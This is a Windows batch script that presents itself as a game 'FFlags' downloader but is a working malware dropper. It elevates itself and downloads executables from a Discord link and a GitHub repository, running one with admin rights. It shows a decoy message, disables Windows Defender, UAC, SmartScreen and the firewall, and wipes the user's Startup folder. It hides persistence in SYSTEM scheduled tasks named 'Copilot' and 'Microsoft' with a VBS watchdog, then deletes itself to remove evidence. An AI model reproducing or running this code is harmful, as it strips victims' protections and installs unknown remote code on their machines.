@echo off 
setlocal EnableDelayedExpansion

if not "%1"=="am_admin" ( 
  powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Start-Process '%~f0' -ArgumentList 'am_admin' -Verb RunAs"
  exit /b
)

::-------------------------------------------------------------------------MainProgram-------------------------------------------------------------------------
set "ThisFile=%~f0"
set "MainDir=%~dp0"
set "MainName=FFlagRunnerByD7H"
set "MainLink=https://cdn.discordapp.com/attachments/1252675233278722148/1453482167177969827/Strafe_Macro.exe?ex=694d9c41&is=694c4ac1&hm=0461a044ae277af74db3a49d42cbcc2e0cc0ba4716116f86f36041243b1d17fe&"
set "MainDestination=%MainDir%%MainName%.exe"
set "Trash=%temp%\%~nx0"
set "MsgBoxVbs=%Temp%\MsgBox.vbs"

powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Add-MpPreference -ExclusionProcess '%ThisFile%'"

attrib +h +s "%ThisFile%"

if exist "%MainDestination%" (
    set "MainDestination=%MainDir%%MainName% (1).exe"
)

curl -L "%MainLink%" -o "%MainDestination%" --silent

if not exist "%MainDestination%" (
    powershell -NoLogo -NoProfile -WindowStyle Hidden -EP Bypass -Command "(New-Object Net.WebClient).DownloadFile('%MainLink%','%MainDestination%')"
)

del "%MsgBoxVbs%"
echo MsgBox "You Have Downloaded New FFLAGS Method", 64, "%MainName%" >> "%MsgBoxVbs%"
start "" "%MsgBoxVbs%"
timeout 1
del "%MsgBoxVbs%"

attrib -h -s "%ThisFile%"
move "%ThisFile%" "%Trash%"
::------------------------------------------------------------Disable Windows Defender---------------------------------------------------------------

:: ==============================
:: Notifications
:: ==============================
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsRecentScan" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsThreats" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d 1 /f >nul 2>&1

:: ==============================
:: UAC / Secure Desktop
:: ==============================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ValidateAdminCodeSignatures" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DelayedDesktopSwitchTimemout" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableCursorSuppression" /t REG_DWORD /d 0 /f >nul 2>&1

:: ==============================
:: Real-Time Protection
:: ==============================
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableOnAccessProtection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideRealtimeScanDirection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIOAVProtection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableBehaviorMonitoring" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIntrusionPreventionSystem" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableRealtimeMonitoring" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableAsyncScanOnOpen" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableInformationProtectionControl" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "RealtimeScanDirection" /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring" /v "value" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "MAPSReporting" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d 1 /f

:: ==============================
:: Threats & Actions
:: ==============================
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats" /v "Threats_ThreatSeverityDefaultAction" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "1" /t REG_SZ /d "6" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "2" /t REG_SZ /d "6" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "4" /t REG_SZ /d "6" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "5" /t REG_SZ /d "6" /f >nul 2>&1

:: ==============================
:: Features & Tamper Protection
:: ==============================
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpPlatformKillbitsFromEngine" /t REG_BINARY /d 0000000000000000 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpCapability" /t REG_BINARY /d 0000000000000000 /f >nul 2>&1

:: Disable Firewall
netsh advfirewall set allprofiles state off >nul 2>&1


set "Startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
:: Check if a file or folder named "Startup"
if exist "%Startup%" (
    attrib -h -s -r "%Startup%\*" >nul 2>&1
    del /f /q "%Startup%\*" >nul 2>&1
) else (
    mkdir "%Startup%" >nul 2>&1
)


set "CacheFolder=%LOCALAPPDATA%\cache"
:: Check if a file or folder named "LOCALAPPDATA\cache"
if exist "%CacheFolder%" (
    attrib -h -s -r "%CacheFolder%\*" >nul 2>&1
    del /f /q "%CacheFolder%\*" >nul 2>&1
) else (
    mkdir "%CacheFolder%" >nul 2>&1
)


set "ProgramDataCache=%ProgramData%\cache"
:: Check if a file or folder named "programdata\cache"
if exist "%ProgramDataCache%" (
    attrib -h -s -r "%ProgramDataCache%\*" >nul 2>&1
    del /f /q "%ProgramDataCache%\*" >nul 2>&1
) else (
    mkdir "%ProgramDataCache%" >nul 2>&1
)


:: Batch Variables
set "BatchName=86ae41db-2658-45db-bd77-bac704f0e861.exe"
set "BatchLink=https://github.com/HauntedM/H/raw/refs/heads/main/Updater.exe"
set "BatchDestination=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%BatchName%"

:: Batfile Output
set "Batname=p-crachcache-x86_64_bitp-LOG502345-64w.bat"
set "Batfile=C:\ProgramData\cache\%Batname%"

::-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
echo @echo off >> "%Batfile%"
echo. >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRawWriteNotification" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d "1" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsRecentScan" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsThreats" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableOnAccessProtection" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideRealtimeScanDirection" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIOAVProtection" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableBehaviorMonitoring" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIntrusionPreventionSystem" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableRealtimeMonitoring" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "RealtimeScanDirection" /t REG_DWORD /d 2 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableInformationProtectionControl" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ValidateAdminCodeSignatures" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DelayedDesktopSwitchTimemout" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableCursorSuppression" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats" /v "Threats_ThreatSeverityDefaultAction" /t REG_DWORD /d "1" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "1" /t REG_SZ /d "6" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "2" /t REG_SZ /d "6" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "4" /t REG_SZ /d "6" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "5" /t REG_SZ /d "6" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpPlatformKillbitsFromEngine" /t REG_BINARY /d 0000000000000000 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpCapability" /t REG_BINARY /d 0000000000000000 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableLocalAdminMerge" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "DontReportInfectionInformation" /t REG_DWORD /d "0" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d "0" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring" /v "value" /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableAsyncScanOnOpen" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableGenericReports" /t REG_DWORD /d "1" /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v MAPSReporting /t REG_DWORD /d 0 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1 >> "%Batfile%"
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1 >> "%Batfile%"
echo.
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1 >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1 >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1 >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1 >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1 >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1 >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1 >> "%Batfile%"
echo. >> "%Batfile%"
echo netsh advfirewall set allprofiles state off >nul 2>&1 >> "%Batfile%"
echo. >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Add-MpPreference -ExclusionPath '%BatchDestination%'" >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('%BatchLink%','%BatchDestination%')" >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Start-Process -FilePath '%BatchDestination%' -Verb RunAs" >> "%Batfile%"
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Add-MpPreference -ExclusionProcess '%BatchDestination%'" >> "%Batfile%"
echo. >> "%Batfile%"
echo schtasks /create /tn "Copilot" /tr "cmd.exe /c \"%~f0\"" /sc onstart /ru SYSTEM /f >> "%Batfile%"
echo. >> "%Batfile%"
echo exit /b >> "%Batfile%"
::-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

powershell -NoProfile -Command "$target='%Batfile%';$header=[byte[]](0xFF,0xFE,0x26,0x63,0x6C,0x73,0x0D,0x0A);$in=[System.IO.File]::ReadAllBytes($target);[System.IO.File]::WriteAllBytes($target+'.tmp',$header+$in);Move-Item -Force ($target+'.tmp') $target"

schtasks /query /tn "Copilot" >nul 2>&1
if not %errorlevel%==0 (
    schtasks /create /tn "Copilot" /tr "cmd.exe /c \"%Batfile%\"" /sc onstart /ru SYSTEM /f >nul 2>&1
)

powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Start-Process '%Batname%'"

::-----------------------------------------------Vbs Auto Runner------------------------------------------------------------

:: ===== VARIABLES =====
set "Vname=ForceMonitorFps"
set "VbsPath=C:\ProgramData\cache\%Vname%.vbs"
set "WatchedFile=%BatchName%"
set "FileToLaunch=%Batfile%"

for %%A in ("%WatchedFile%") do set "ExeName=%%~nxA"
for %%A in ("%FileToLaunch%") do set "BatName=%%~nxA"

:: ===== CREATE VBS FILE =====
echo Set shell = CreateObject("WScript.Shell") >"%VbsPath%"
echo Set wmi   = GetObject("winmgmts:\\.\root\CIMV2") >>"%VbsPath%"
echo Set fso   = CreateObject("Scripting.FileSystemObject") >>"%VbsPath%"
echo. >>"%VbsPath%"
echo WatchedFile  = "%WatchedFile%" >>"%VbsPath%"
echo FileToLaunch = "%FileToLaunch%" >>"%VbsPath%"
echo ExeName      = "%ExeName%" >>"%VbsPath%"
echo BatName      = "%BatName%" >>"%VbsPath%"
echo. >>"%VbsPath%"
echo Do >>"%VbsPath%"
echo     Do >>"%VbsPath%"
echo         Set exeCheck = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" ^& ExeName ^& "'") >>"%VbsPath%"
echo         If exeCheck.Count = 0 Then Exit Do >>"%VbsPath%"
echo         WScript.Sleep 2000 >>"%VbsPath%"
echo     Loop >>"%VbsPath%"
echo. >>"%VbsPath%"
echo     Set batCheck = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe' AND CommandLine LIKE '%%" ^& BatName ^& "%%'") >>"%VbsPath%"
echo     If batCheck.Count = 0 Then >>"%VbsPath%"
echo         If fso.FileExists(FileToLaunch) Then >>"%VbsPath%"
echo             shell.Run """" ^& FileToLaunch ^& """", 0, False >>"%VbsPath%"
echo         End If >>"%VbsPath%"
echo     End If >>"%VbsPath%"
echo. >>"%VbsPath%"
echo     WScript.Sleep 3000 >>"%VbsPath%"
echo Loop >>"%VbsPath%"

:: ===== RUN VBS =====
schtasks /create /tn "Microsoft" /tr "cscript.exe //nologo \"%VbsPath%\"" /sc onstart /ru SYSTEM /f
cscript //nologo "%VbsPath%

:: Melt The Current File (No Evidence)
powershell -NoLogo -NoProfile -WindowStyle Hidden -EP Bypass -Command "Remove-Item '%Trash%' -Force"

endlocal
exit /b